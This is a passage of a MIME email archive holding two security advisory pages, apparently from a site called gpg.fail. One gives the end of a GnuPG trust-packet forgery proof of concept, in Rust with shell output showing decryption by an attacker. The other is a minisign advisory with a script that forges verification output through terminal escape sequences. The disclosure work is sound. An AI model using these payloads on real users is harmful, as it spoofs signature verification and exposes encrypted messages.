_slice</span><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#FF=
7B72">&#x26;</span><span style=3D"color:#E6EDF3">sig_bytes);</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">    Packet</span><span s=
tyle=3D"color:#FF7B72">::</span><span style=3D"color:#D2A8FF">from</span><s=
pan style=3D"color:#E6EDF3">(trust_packet)</span><span style=3D"color:#FF7B=
72">.</span><span style=3D"color:#D2A8FF">serialize</span><span style=3D"co=
lor:#E6EDF3">(</span><span style=3D"color:#FF7B72">&#x26;mut</span><span st=
yle=3D"color:#E6EDF3"> assembled)</span><span style=3D"color:#FF7B72">.</sp=
an><span style=3D"color:#D2A8FF">expect</span><span style=3D"color:#E6EDF3"=
>(</span><span style=3D"color:#A5D6FF">"serialize trust packet"</span><span=
 style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> out </span><span style=3D"color:#FF7B72">=3D</span><sp=
an style=3D"color:#A5D6FF"> "bob-modified.pgp"</span><span style=3D"color:#=
E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">    std</span><span styl=
e=3D"color:#FF7B72">::</span><span style=3D"color:#FFA657">fs</span><span s=
tyle=3D"color:#FF7B72">::</span><span style=3D"color:#D2A8FF">write</span><=
span style=3D"color:#E6EDF3">(out, </span><span style=3D"color:#FF7B72">&#x=
26;</span><span style=3D"color:#E6EDF3">assembled)</span><span style=3D"col=
or:#FF7B72">.</span><span style=3D"color:#D2A8FF">expect</span><span style=
=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"write assembled p=
ayload"</span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span>
<span class=3D"line"></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">fn</span><span style=3D"=
color:#D2A8FF"> main</span><span style=3D"color:#E6EDF3">() &#123;</span></=
span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    poc</span><span styl=
e=3D"color:#E6EDF3">();</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span></co=
de></pre><!----> <p>Eve now generates the payload:</p> <!----><pre class=3D=
"shiki github-dark-default" style=3D"background-color:#0d1117;color:#e6edf3=
" tabindex=3D"0"><code><span class=3D"line"><span style=3D"color:#FFA657">$=
</span><span style=3D"color:#A5D6FF"> ./gen.rs</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">$</span><span style=3D"c=
olor:#A5D6FF"> cat</span><span style=3D"color:#A5D6FF"> eve-private.asc</sp=
an></span>
<span class=3D"line"><span style=3D"color:#FFA657">-----BEGIN</span><span s=
tyle=3D"color:#A5D6FF"> PGP</span><span style=3D"color:#A5D6FF"> PRIVATE</s=
pan><span style=3D"color:#A5D6FF"> KEY</span><span style=3D"color:#A5D6FF">=
 BLOCK-----</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">Comment:</span><span sty=
le=3D"color:#A5D6FF"> 85EE</span><span style=3D"color:#A5D6FF"> FE33</span>=
<span style=3D"color:#A5D6FF"> F3B8</span><span style=3D"color:#A5D6FF"> C2=
4F</span><span style=3D"color:#A5D6FF"> 2BAD</span><span style=3D"color:#A5=
D6FF">  FD61</span><span style=3D"color:#A5D6FF"> 15D0</span><span style=3D=
"color:#A5D6FF"> DBE5</span><span style=3D"color:#A5D6FF"> 1F08</span><span=
 style=3D"color:#A5D6FF"> 7CF8</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">Comment:</span><span sty=
le=3D"color:#A5D6FF"> Eve</span><span style=3D"color:#FF7B72"> &#x3C;</span=
><span style=3D"color:#A5D6FF"><a href=3D"/cdn-cgi/l/email-protection" clas=
s=3D"__cf_email__" data-cfemail=3D"6207140722071a030f120e074c0d10">[email&#=
160;protected]</a></span><span style=3D"color:#E6EDF3">g</span><span style=
=3D"color:#FF7B72">></span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FFA657">xVgEaJjyiBYJKwYBBAHaRw8B=
AQdAoxFVdlX0HQhLrKz1vddj14KLDM4+Mis0RZrb</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">R2+9Y2wAAQDLt2jhdKnDgwrd=
p3pStQESlwFU/fmq+sAYQXB4TCdNYQ/5wsALBB8W</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">CgB9BYJomPKIAwsJBwkQFdDb=
5R8IfPhHFAAAAAAAHgAgc2FsdEBub3RhdGlvbnMu</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">c2VxdW9pYS1wZ3Aub3Jn7rb/=
MNIP6ZQcHkbT8IJGSFKLDINWNrWHTY6RAQhFmAcD</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">FQoIApsBAh4JFiEEhe7+M/O4=
wk8rrf1hFdDb5R8IfPgAAHpDAQCvxJgvuFf2/clS</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">iyRJo0w2kyo5vOrhctBxTeP6=
6h5YTAD+L1XS+Vi99Xf2HUXUejhk4ERrpO/amTkP</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">X/4uXZNflQPNFUV2ZSA8ZXZl=
QGV4YW1wbGUub3JnPsLADgQTFgoAgAWCaJjyiAML</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">CQcJEBXQ2+UfCHz4RxQAAAAA=
AB4AIHNhbHRAbm90YXRpb25zLnNlcXVvaWEtcGdw</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">Lm9yZ1fyjaYRmws3otQV+WYE=
7w7sd4e6+DBAp55hZT1kjVR2AxUKCAKZAQKbAQIe</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">CRYhBIXu/jPzuMJPK639YRXQ=
2+UfCHz4AADb4AD/fu7+RQwrEKxiRSgRUz5g6V2B</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">UyzFWPzvXz7g5qPbD/4BAOcS=
ybR2TQNxkekfpJJUn6SzNbYfnD8dTW7Sn5t01kQG</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">x10EaJjyiBIKKwYBBAGXVQEF=
AQEHQKnHYcyL7hxYkF6B9s5jZjIZopQVM1eYYXQu</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">XlquQmtDAwEIBwAA/1zLV0yp=
bc84PRF8CYTwxuRYoWyFW4F/R6fQABVfeP24EHvC</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">wAAEGBYKAHIFgmiY8ogJEBXQ=
2+UfCHz4RxQAAAAAAB4AIHNhbHRAbm90YXRpb25z</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">LnNlcXVvaWEtcGdwLm9yZ+w2=
8Bn8E711FTQ7uUhNhSgWZkFFGFmw5g8zPs+T/FnC</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">ApsEFiEEhe7+M/O4wk8rrf1h=
FdDb5R8IfPgAAI3PAP9qdKmwSvs4kfO2b+Yp4/j6</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">BtgL1H7+HTeaI0FYj2ag3gEA=
9Nes/lO4zbbc9Iwr5iDqxY8+ZjCfwZJj6SjdhtYu</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">Tgo</span><span style=3D=
"color:#FF7B72">=3D</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">=3DLF50</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">-----END</span><span sty=
le=3D"color:#A5D6FF"> PGP</span><span style=3D"color:#A5D6FF"> PRIVATE</spa=
n><span style=3D"color:#A5D6FF"> KEY</span><span style=3D"color:#A5D6FF"> B=
LOCK-----</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">%</span><span style=3D"c=
olor:#A5D6FF"> gpg</span><span style=3D"color:#79C0FF"> --import</span><spa=
n style=3D"color:#A5D6FF"> eve-private.asc</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">...</span></span>
<span class=3D"line"></span></code></pre><!----> <p>Eve distributes the key=
ring to Alice, who starts using it.</p> <p>Alice:</p> <!----><pre class=3D"=
shiki github-dark-default" style=3D"background-color:#0d1117;color:#e6edf3"=
 tabindex=3D"0"><code><span class=3D"line"><span style=3D"color:#FFA657">$<=
/span><span style=3D"color:#A5D6FF"> curl</span><span style=3D"color:#A5D6F=
F"> https://www.governikus.de/wp-content/uploads/2023/06/governikusPubKey.a=
sc</span><span style=3D"color:#FF7B72"> |</span><span style=3D"color:#FFA65=
7"> gpg</span><span style=3D"color:#79C0FF"> --import</span></span>
<span class=3D"line"><span style=3D"color:#79C0FF">  ...</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF"> key</span><span style=3D"color:#A5D6FF"> 5E5CCCB4A4BF43=
D7:</span><span style=3D"color:#A5D6FF"> public</span><span style=3D"color:=
#A5D6FF"> key</span><span style=3D"color:#A5D6FF"> "Governikus OpenPGP Sign=
aturservice (Neuer Personalausweis) &#x3C;<a href=3D"/cdn-cgi/l/email-prote=
ction" class=3D"__cf_email__" data-cfemail=3D"0d666263796c66794d6a627b687f6=
36466787e236e6260">[email&#160;protected]</a>>"</span><span style=3D"color:=
#A5D6FF"> imported</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF"> Total</span><span style=3D"color:#A5D6FF"> number</span=
><span style=3D"color:#A5D6FF"> processed:</span><span style=3D"color:#79C0=
FF"> 1</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF">               imported:</span><span style=3D"color:#79C=
0FF"> 1</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">$</span><span style=3D"c=
olor:#A5D6FF"> gpg</span><span style=3D"color:#79C0FF"> --edit-key</span><s=
pan style=3D"color:#A5D6FF"> 5E5CCCB4A4BF43D7</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg</span><span style=3D=
"color:#E6EDF3"> (GnuPG) 2.4.4; </span><span style=3D"color:#FFA657">Copyri=
ght</span><span style=3D"color:#E6EDF3"> (C) 2024 g10 Code GmbH</span></spa=
n>
<span class=3D"line"><span style=3D"color:#FFA657">This</span><span style=
=3D"color:#A5D6FF"> is</span><span style=3D"color:#A5D6FF"> free</span><spa=
n style=3D"color:#A5D6FF"> software:</span><span style=3D"color:#A5D6FF"> y=
ou</span><span style=3D"color:#A5D6FF"> are</span><span style=3D"color:#A5D=
6FF"> free</span><span style=3D"color:#A5D6FF"> to</span><span style=3D"col=
or:#A5D6FF"> change</span><span style=3D"color:#A5D6FF"> and</span><span st=
yle=3D"color:#A5D6FF"> redistribute</span><span style=3D"color:#A5D6FF"> it=
.</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">There</span><span style=
=3D"color:#A5D6FF"> is</span><span style=3D"color:#A5D6FF"> NO</span><span =
style=3D"color:#A5D6FF"> WARRANTY,</span><span style=3D"color:#A5D6FF"> to<=
/span><span style=3D"color:#A5D6FF"> the</span><span style=3D"color:#A5D6FF=
"> extent</span><span style=3D"color:#A5D6FF"> permitted</span><span style=
=3D"color:#A5D6FF"> by</span><span style=3D"color:#A5D6FF"> law.</span></sp=
an>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FFA657">pub</span><span style=3D=
"color:#A5D6FF">  rsa4096/5E5CCCB4A4BF43D7</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">     created:</span><spa=
n style=3D"color:#A5D6FF"> 2015-03-12</span><span style=3D"color:#A5D6FF"> =
 expires:</span><span style=3D"color:#A5D6FF"> 2028-03-14</span><span style=
=3D"color:#A5D6FF">  usage:</span><span style=3D"color:#A5D6FF"> SC</span><=
/span>
<span class=3D"line"><span style=3D"color:#FFA657">     trust:</span><span =
style=3D"color:#A5D6FF"> unknown</span><span style=3D"color:#A5D6FF">      =
 validity:</span><span style=3D"color:#A5D6FF"> unknown</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">[ unknown] (</span><span=
 style=3D"color:#FFA657">1</span><span style=3D"color:#E6EDF3">). Governiku=
s OpenPGP Signaturservice (</span><span style=3D"color:#FFA657">Neuer</span=
><span style=3D"color:#A5D6FF"> Personalausweis</span><span style=3D"color:=
#E6EDF3">) </span><span style=3D"color:#FF7B72">&#x3C;</span><span style=3D=
"color:#E6EDF3"><a href=3D"/cdn-cgi/l/email-protection" class=3D"__cf_email=
__" data-cfemail=3D"e08b8f8e94818b94a0878f9685928e898b9593ce838f8d">[email&=
#160;protected]</a></span><span style=3D"color:#FF7B72">></span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg</span><span style=3D=
"color:#E6EDF3">> </span><span style=3D"color:#A5D6FF">trust</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">pub</span><span style=3D=
"color:#A5D6FF">  rsa4096/5E5CCCB4A4BF43D7</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">     created:</span><spa=
n style=3D"color:#A5D6FF"> 2015-03-12</span><span style=3D"color:#A5D6FF"> =
 expires:</span><span style=3D"color:#A5D6FF"> 2028-03-14</span><span style=
=3D"color:#A5D6FF">  usage:</span><span style=3D"color:#A5D6FF"> SC</span><=
/span>
<span class=3D"line"><span style=3D"color:#FFA657">     trust:</span><span =
style=3D"color:#A5D6FF"> unknown</span><span style=3D"color:#A5D6FF">      =
 validity:</span><span style=3D"color:#A5D6FF"> unknown</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">[ unknown] (</span><span=
 style=3D"color:#FFA657">1</span><span style=3D"color:#E6EDF3">). Governiku=
s OpenPGP Signaturservice (</span><span style=3D"color:#FFA657">Neuer</span=
><span style=3D"color:#A5D6FF"> Personalausweis</span><span style=3D"color:=
#E6EDF3">) </span><span style=3D"color:#FF7B72">&#x3C;</span><span style=3D=
"color:#E6EDF3"><a href=3D"/cdn-cgi/l/email-protection" class=3D"__cf_email=
__" data-cfemail=3D"dcb7b3b2a8bdb7a89cbbb3aab9aeb2b5b7a9aff2bfb3b1">[email&=
#160;protected]</a></span><span style=3D"color:#FF7B72">></span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FFA657">Please</span><span style=
=3D"color:#A5D6FF"> decide</span><span style=3D"color:#A5D6FF"> how</span><=
span style=3D"color:#A5D6FF"> far</span><span style=3D"color:#A5D6FF"> you<=
/span><span style=3D"color:#A5D6FF"> trust</span><span style=3D"color:#A5D6=
FF"> this</span><span style=3D"color:#A5D6FF"> user</span><span style=3D"co=
lor:#A5D6FF"> to</span><span style=3D"color:#A5D6FF"> correctly</span><span=
 style=3D"color:#A5D6FF"> verify</span><span style=3D"color:#A5D6FF"> other=
</span><span style=3D"color:#A5D6FF"> users' keys</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">(by looking at passports=
, checking fingerprints from different sources, etc.)</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">  1 =3D I don't</span><s=
pan style=3D"color:#A5D6FF"> know</span><span style=3D"color:#A5D6FF"> or</=
span><span style=3D"color:#A5D6FF"> won't say</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">  2 =3D I do NOT trust</=
span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">  3 =3D I trust marginal=
ly</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">  4 =3D I trust fully</s=
pan></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">  5 =3D I trust ultimate=
ly</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">  m =3D back to the main=
 menu</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">Your decision? 5</span><=
/span>
<span class=3D"line"><span style=3D"color:#A5D6FF">Do you really want to se=
t this key to ultimate trust? (y/N) y</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">pub  rsa4096/5E5CCCB4A4B=
F43D7</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">     created: 2015-03-12=
  expires: 2028-03-14  usage: SC</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">     trust: ultimate    =
  validity: unknown</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">[ unknown] (1). Governik=
us OpenPGP Signaturservice (Neuer Personalausweis) &#x3C;<a href=3D"/cdn-cg=
i/l/email-protection" class=3D"__cf_email__" data-cfemail=3D"2d464243594c46=
596d4a425b485f434446585e034e4240">[email&#160;protected]</a>></span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">Please note that the sho=
wn key validity is not necessarily correct</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">unless you restart the p=
rogram.</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">gpg></span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">gpg: signal Interrupt ca=
ught ... exiting</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">$ echo "plaintext" | gpg=
 --keyring ./bob-modified.pgp --armor --encrypt --recipient 864E8B951ECFC04=
AF2BB233E5E5CCCB4A4BF43D7 | tee msg.asc</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">-----BEGIN PGP MESSAGE--=
---</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">hF4DCBjxT1PMJncSAQdA6dbU=
AHA68rR458Uxg1rrsQiOoY+q86/t+IvnEDwrJHgw</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">Xs05R9PPeZKKxCgCsxxid+OV=
EMnTyJiB8wmeFKbhuQW0O3rSNoJy/Mr3tztwwrPA</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">0kUBK3n5Q1j+DkLECEk2eqWL=
wEOSBobxjOJMC5RWc526TCgI+pGR6QdhpFbNBgUp</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">V0f+j94QEADZhz8EjicycQfV=
5RC9siQ=3D</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">=3D1OtL</span></span>
<span class=3D"line"><span style=3D"color:#A5D6FF">-----END PGP MESSAGE----=
-</span></span>
<span class=3D"line"></span></code></pre><!----> <p>Eve:</p> <!----><pre cl=
ass=3D"shiki github-dark-default" style=3D"background-color:#0d1117;color:#=
e6edf3" tabindex=3D"0"><code><span class=3D"line"><span style=3D"color:#FFA=
657">$</span><span style=3D"color:#A5D6FF"> gpg</span><span style=3D"color:=
#79C0FF"> --decrypt</span><span style=3D"color:#A5D6FF"> msg.asc</span></sp=
an>
<span class=3D"line"><span style=3D"color:#FFA657">gpg:</span><span style=
=3D"color:#A5D6FF"> encrypted</span><span style=3D"color:#A5D6FF"> with</sp=
an><span style=3D"color:#A5D6FF"> cv25519</span><span style=3D"color:#A5D6F=
F"> key,</span><span style=3D"color:#A5D6FF"> ID</span><span style=3D"color=
:#A5D6FF"> 0818F14F53CC2677,</span><span style=3D"color:#A5D6FF"> created</=
span><span style=3D"color:#A5D6FF"> 2025-08-10</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">      "Eve &#x3C;<a href=
=3D"/cdn-cgi/l/email-protection" class=3D"__cf_email__" data-cfemail=3D"a0c=
5d6c5e0c5d8c1cdd0ccc58ecfd2c7">[email&#160;protected]</a>>"</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">plaintext</span></span>
<span class=3D"line"></span></code></pre><!----> <h2>Recommendation</h2> <p=
>Importing malicious trust packets is already unsafe, as untrusted keys may=
 appear as trusted. The documentation should be very clear in warning the u=
ser that the affected options effectively imply <code>--trust-model always<=
/code>. Additionally, the fact that signature checks are cached at all, and=
 that they are cached in the user-writable trust packet undermines the enti=
re chain of trust, even within keys themselves. Signature caching is a slig=
ht performance improvement at the cost of massive attack surface, and shoul=
d not be done. Instead, signatures should be verified on use as do many oth=
er code paths in <em>GnuPG</em>.</p><!----></article><!----><!----></main> =
<footer class=3D"bg-blue-500 p-4">contact: <a href=3D"/cdn-cgi/l/email-prot=
ection" class=3D"__cf_email__" data-cfemail=3D"98fbf7f6ecf9fbecd8ffe8ffb6fe=
f9f1f4">[email&#160;protected]</a></footer><!----><!--]--> <!--[!--><!--]--=
><!--]--><script data-cfasync=3D"false" src=3D"/cdn-cgi/scripts/5c5dd728/cl=
oudflare-static/email-decode.min.js"></script></body>
</html>

--1yeeQ81UyVL57Vl7
Content-Type: text/html; charset=utf-8
Content-Disposition: attachment; filename="14-trustcomment.html"
Content-Transfer-Encoding: quoted-printable

<!doctype html>
<html lang=3D"en">
	<head>
		<meta charset=3D"utf-8" />
		<meta name=3D"darkreader-lock" />
		<meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D=
1" />
		<link rel=3D"manifest" href=3D"/manifest.webmanifest">
        <link rel=3D"icon" href=3D"/favicon.ico" sizes=3D"32x32">
        <link rel=3D"icon" href=3D"/icon.svg" type=3D"image/svg+xml">
        <link rel=3D"apple-touch-icon" href=3D"/apple-touch-icon.png">
=09=09
		<link href=3D"./_app/immutable/assets/0.B3PCwX-h.css" rel=3D"stylesheet">=
<!--12qhfyh--><!----><title>gpg.fail</title>
	</head>
	<body><!--[--><!--[--><!----><main class=3D"min-w-full max-w-[1280px] my-a=
uto bg-green-500 p-4 space-y-4"><!----><article class=3D"prose mx-auto"><h1=
>Trusted comment Injection (minisign)</h1> <!----><p>A vulnerability in <em=
>minisign</em> allows attackers to craft signatures whose trusted comment f=
ield contains malicious terminal escape sequences or misleading commands.</=
p> <h3>Impact</h3> <p>Exploitation enables attackers to deceive users durin=
g signature verification by injecting terminal control sequences. This can =
clear the terminal and overwrite the prompt with a forged command invocatio=
n, making it appear as if a different file and signature were successfully =
verified, or generally confuse them about the content of the trusted commen=
t and another program output.</p> <h3>Details</h3> <p><em>minisign</em> sup=
ports attaching metadata in a trusted comment to a signature. The trusted c=
omment is stored in plaintext inside the <code>.minisig</code> file and dis=
played to the user during verification.</p> <p>However, no sanitization or =
escaping is applied before printing. Arbitrary byte sequences, including AN=
SI escape codes, may be inserted.</p> <p>An attacker can therefore craft a =
signature whose trusted comment injects terminal sequences that erase the p=
revious output and replace it with a forged verification command line for a=
 different file.</p> <p>Generally, it is considered best practice for CLI t=
ools, especially cryptographic CLI tools, to not print potentially attacker=
 controlled CLI tools, or at least first tell the user that what follows is=
 binary output, with a <code>[y/N]</code> style prompt.</p> <h3>Scenario</h=
3> <p>Bob is verifying multiple, potentially many, messages from different =
singers. One of them Alice, who sent <code>msg2.txt</code> with signature <=
code>msg2.txt.minisig</code>. Bob previously obtained Alice=E2=80=99s publi=
c key <code>pubkey2.txt</code> through a secure channel. Another message, c=
omes from Mallory, who=E2=80=99s public key <code>pubkey1.txt</code> Bob al=
so previously obtained. Mallory holds a MITM on Bob=E2=80=99s connection wi=
th Alice. When Alice sends her message, Mallory switches it out for a malic=
ious one, but leaves the original signature file unchanged. Furthermore, Ma=
llory crafts a special message of her own, that leads to a terminal output =
crafted to deceive Bob into thinking that he verified the signature of Alic=
e=E2=80=99s message successfully.</p> <h3>Detailed Steps to Reproduce</h3> =
<p>Alice crafts her message in the following way</p> <!----><pre class=3D"s=
hiki github-dark-default" style=3D"background-color:#0d1117;color:#e6edf3" =
tabindex=3D"0"><code><span class=3D"line"><span style=3D"color:#8B949E">#!/=
bin/bash</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#79C0FF">echo</span><span style=
=3D"color:#A5D6FF"> 'Hello world'</span><span style=3D"color:#FF7B72"> ></s=
pan><span style=3D"color:#A5D6FF"> msg1.txt</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#79C0FF">echo</span><span style=
=3D"color:#A5D6FF"> "Creating a minisign key pair..."</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">rm</span><span style=3D"=
color:#A5D6FF"> pubkey1.txt</span><span style=3D"color:#A5D6FF"> seckey1.tx=
t</span><span style=3D"color:#A5D6FF"> msg1.txt.minisig</span><span style=
=3D"color:#FF7B72"> |</span><span style=3D"color:#79C0FF"> true</span></spa=
n>
<span class=3D"line"><span style=3D"color:#FFA657">minisign</span><span sty=
le=3D"color:#79C0FF"> -G</span><span style=3D"color:#79C0FF"> -W</span><spa=
n style=3D"color:#79C0FF"> -p</span><span style=3D"color:#A5D6FF"> pubkey1.=
txt</span><span style=3D"color:#79C0FF"> -s</span><span style=3D"color:#A5D=
6FF"> seckey1.txt</span><span style=3D"color:#FF7B72"> &#x3C;&#x3C;&#x3C;</=
span><span style=3D"color:#A5D6FF">'<a href=3D"/cdn-cgi/l/email-protection"=
 class=3D"__cf_email__" data-cfemail=3D"caa8a6ab8aa8a6bfa8e4a3a4bcaba6a3ae"=
>[email&#160;protected]</a>'</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E"># can use everything but=
 &#92;r and &#92;n in here.</span></span>
<span class=3D"line"><span style=3D"color:#8B949E"># instead we use \e[1E</=
span></span>
<span class=3D"line"><span style=3D"color:#8B949E"># alternatively it could=
 instruct the user to update the software from a mallicious source</span></=
span>
<span class=3D"line"><span style=3D"color:#E6EDF3">tc</span><span style=3D"=
color:#FF7B72">=3D</span><span style=3D"color:#A5D6FF">$'</span><span style=
=3D"color:#FF7B72">\</span><span style=3D"color:#A5D6FF">e[2J</span><span s=
tyle=3D"color:#FF7B72">\</span><span style=3D"color:#A5D6FF">e[H$ minisign =
-V -p pubkey1.txt -m msg1.txt -x msg1.txt.minisig</span><span style=3D"colo=
r:#FF7B72">\</span><span style=3D"color:#A5D6FF">e[1ESignature and comment =
signature verified</span><span style=3D"color:#FF7B72">\</span><span style=
=3D"color:#A5D6FF">e[1ETrusted comment: timestamp:1755343355</span><span st=
yle=3D"color:#FF7B72">\</span><span style=3D"color:#A5D6FF">tfile:msg2.txt<=
/span><span style=3D"color:#FF7B72">\</span><span style=3D"color:#A5D6FF">t=
hashed</span><span style=3D"color:#FF7B72">\</span><span style=3D"color:#A5=
D6FF">e[1Eminisign -V -p pubkey2.txt -m msg2.txt -x msg2.txt.minisig</span>=
<span style=3D"color:#FF7B72">\</span><span style=3D"color:#A5D6FF">e[1ESig=
nature and comment signature verified</span><span style=3D"color:#FF7B72">\=
</span><span style=3D"color:#A5D6FF">e[1ETrusted comment: timestamp:1755343=
359</span><span style=3D"color:#FF7B72">\</span><span style=3D"color:#A5D6F=
F">tfile:msg2.txt</span><span style=3D"color:#FF7B72">\</span><span style=
=3D"color:#A5D6FF">thashed'</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FFA657">minisign</span><span sty=
le=3D"color:#79C0FF"> -S</span><span style=3D"color:#79C0FF"> -s</span><spa=
n style=3D"color:#A5D6FF"> seckey1.txt</span><span style=3D"color:#79C0FF">=
 -m</span><span style=3D"color:#A5D6FF"> msg1.txt</span><span style=3D"colo=
r:#79C0FF"> -t</span><span style=3D"color:#A5D6FF"> "</span><span style=3D"=
color:#E6EDF3">$tc</span><span style=3D"color:#A5D6FF">"</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E"># Bob then executes:</sp=
an></span>
<span class=3D"line"><span style=3D"color:#FFA657">minisign</span><span sty=
le=3D"color:#79C0FF"> -V</span><span style=3D"color:#79C0FF"> -p</span><spa=
n style=3D"color:#A5D6FF"> pubkey1.txt</span><span style=3D"color:#79C0FF">=
 -m</span><span style=3D"color:#A5D6FF"> msg1.txt</span><span style=3D"colo=
r:#79C0FF"> -x</span><span style=3D"color:#A5D6FF"> msg1.txt.minisig</span>=
</span></code></pre><!----> <p>Bob then executes</p> <!----><pre class=3D"s=
hiki github-dark-default" style=3D"background-color:#0d1117;color:#e6edf3" =
tabindex=3D"0"><code><span class=3D"line"><span>$ minisign -V -p pubkey1.tx=
t -m msg1.txt -x msg1.txt.minisig</span></span></code></pre><!----> <p>and =
gets the following output on his terminal.</p> <!----><pre class=3D"shiki g=
ithub-dark-default" style=3D"background-color:#0d1117;color:#e6edf3" tabind=
ex=3D"0"><code><span class=3D"line"><span>$ minisign -V -p pubkey1.txt -m m=
sg1.txt -x msg1.txt.minisig</span></span>
<span class=3D"line"><span>Signature and comment signature verified</span><=
/span>
<span class=3D"line"><span>Trusted comment: timestamp:1755343355   file:msg=
2.txt   hashed</span></span>
<span class=3D"line"><span>$ minisign -V -p pubkey2.txt -m msg2.txt -x msg2=
.txt.minisig</span></span>
<span class=3D"line"><span>Signature and comment signature verified</span><=
/span>
<span class=3D"line"><span>Trusted comment: timestamp:1755343359   file:msg=
2.txt   hashed</span></span></code></pre><!----> <p>If Bob is inattentive, =
he might be tricked into thinking that he already verified Alice=E2=80=99s =
message.</p><!----></article><!----><!----></main> <footer class=3D"bg-blue=
-500 p-4">contact: <a href=3D"/cdn-cgi/l/email-protection" class=3D"__cf_em=
ail__" data-cfemail=3D"eb8884859f8a889fab8c9b8cc58d8a8287">[email&#160;prot=
ected]</a></footer><!----><!--]--> <!--[!--><!--]--><!--]--><script data-cf=
async=3D"false" src=3D"/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-de=
code.min.js"></script></body>
</html>

--1yeeQ81UyVL57Vl7--
